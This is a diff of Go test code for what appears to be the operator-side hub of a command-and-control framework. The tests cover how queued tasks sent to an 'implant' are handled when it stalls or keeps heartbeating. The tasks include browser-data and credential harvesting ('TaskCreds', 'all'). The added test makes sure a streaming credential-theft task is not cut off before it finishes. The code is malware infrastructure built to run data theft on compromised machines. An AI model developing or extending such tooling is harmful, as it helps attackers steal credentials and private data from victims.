@@ -143,11 +143,15 @@ func TestStalledTaskFreesTheQueue(t *testing.T) {
 		return nil
 	})
 
-	// the implant never answers this one
+	// the implant never answers this one, but it keeps heartbeating: the
+	// session looks healthy while the task is stuck
 	if _, err := h.Enqueue(s.ID, TaskBrowserDeep, ""); err != nil {
 		t.Fatal(err)
 	}
-	clk.Add(stallBatch + time.Second)
+	for i := 0; i < 6; i++ {
+		clk.Add(10 * time.Second)
+		h.OnFrame(s.ID, protocol.Frame{Type: protocol.CmdHeartbeat})
+	}
 	h.Tick()
 
 	tasks := h.allTasksFor(s.ID)
@@ -213,4 +217,33 @@ func (h *Hub) allTasksFor(sid string) []*Task {
 		}
 	}
 	return out
+}
+
+// TestProgressingTaskIsNotCut is the other half of the guard: a task that keeps
+// streaming rows must survive well past its silence budget.
+func TestProgressingTaskIsNotCut(t *testing.T) {
+	clk := &fakeClock{t: time.Unix(3000, 0)}
+	h := NewHub(clk.Now)
+	s := h.Attach("L1", "1.2.3.4:9", protocol.Register{}, func(protocol.Type, []byte) error { return nil })
+	tid, err := h.Enqueue(s.ID, TaskCreds, "all")
+	if err != nil {
+		t.Fatal(err)
+	}
+	for i := 0; i < 5; i++ { // 5 x 30 s = 150 s, well past the 60 s budget
+		clk.Add(30 * time.Second)
+		h.OnFrame(s.ID, protocol.Frame{Type: protocol.RspData, Payload: []byte("row\n")})
+		h.Tick()
+	}
+	task := h.GetTask(tid)
+	if task == nil || task.Done {
+		t.Fatalf("streaming task was cut: %+v", task)
+	}
+	if got := h.Get(s.ID); got == nil || !got.Busy {
+		t.Fatalf("session should still be working: %+v", got)
+	}
+	// it ends normally once the implant says so
+	h.OnFrame(s.ID, protocol.Frame{Type: protocol.RspEnd})
+	if task := h.GetTask(tid); task == nil || !task.Done || task.Err != "" {
+		t.Fatalf("clean finish mishandled: %+v", task)
+	}
 }
